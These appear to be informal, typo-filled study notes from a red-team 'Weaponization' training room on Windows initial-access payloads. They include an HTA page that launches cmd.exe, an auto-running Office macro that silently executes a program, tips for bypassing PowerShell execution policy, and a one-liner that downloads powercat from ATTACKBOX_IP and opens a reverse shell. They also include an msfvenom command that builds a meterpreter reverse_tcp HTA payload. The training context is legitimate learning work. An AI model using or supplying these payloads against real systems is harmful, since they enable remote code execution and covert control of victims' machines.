Windows Scripting Host (WSH)


#
Windows scripting host is a built-in Windows administration tool that runs batch files to automate and manage tasks within the operating system.

It is a Windows native engine, cscript.exe (for command-line scripts) and wscript.exe (for UI scripts), which are responsible for executing various Microsoft Visual Basic Scripts (VBScript), including vbs and vbe. For more information about VBScript, please visit here. It is important to note that the VBScript engine on a Windows operating system runs and executes applications with the same level of access and permission as a regular user; therefore, it is useful for the red teamers.

Now let's write a simple VBScript code to create a windows message box that shows the Welcome to THM message. Make sure to save the following code into a file, for example, hello.vbs.

Dim message 
message = "Welcome to THM"
MsgBox message

->> tip use not pad to copy and paste paylaoads

->> tip if vbs files are blocked use cscript /e:vbsscripts  path\payload.vbs 



# An HTML Application (HTA)

HTA stands for “HTML Application.” It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered. HTML Applications, also known as HTAs, which are dynamic HTML pages containing JScript and VBScript. The LOLBINS (Living-of-the-land Binaries) tool mshta is used to execute HTA files. It can be executed by itself or automatically from Internet Explorer. 

# checkk!!! the purple

<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
>
><html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html  dint close becaus it dont repelct if this pay load is saved with .hta and a server is lauched from attacker machine a web broswer can be used to acces from user victim http/attackkerip/payload.hta machine which will auto launch cmd.exe  

>






# ms docs vbscript macros


demo exploit 
Sub Document_open()
THM
POC
End Sub

Sub AutoOpen()
THM
POC
End Sub


Sub POC()
Dim payload As String
payload = "calc.exe"
CreateObject("wscript.Shell").Run payload, 0
End Sub

Sub THM()
'
' THM Macro
'
'
MsgBox ("Welcome to Weaponization Room!")
End Sub

->> open ms doc
-> click view-> macro and script 
-> ensure save fromat is 1977-2003 and must be docm or .doc




# note 
->creat vba windows rever shell with msveno
use exploit multi handler 
->set payloay to windows/meteprete/rev_tcp
launch vb revers from microssoft doc by launchin doc
already be listening from msfconsole







# powershell

->> good for scripting
->> use set-execution policy -scope current user signed to execute script
->> then sometimes use powershell -ex bypass -File payload.ps1

->> for c2 clone power cat and cd into it launch a python server from inside the dir on port 8080 or any port workin

->> on another terminal launch nc and listen from another port

->> on victim machine do this an edit accordingly 
C:\Users\thm\Desktop> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd




# note
launching a windoes rev shell through hta use this to save your sanity
msfvenom -p  windows/meterpreter/reverse_tcp LHOST=10.9.3.61  LPORT=5555 -f hta-psh -o payload.hta


migrate after getting shell !!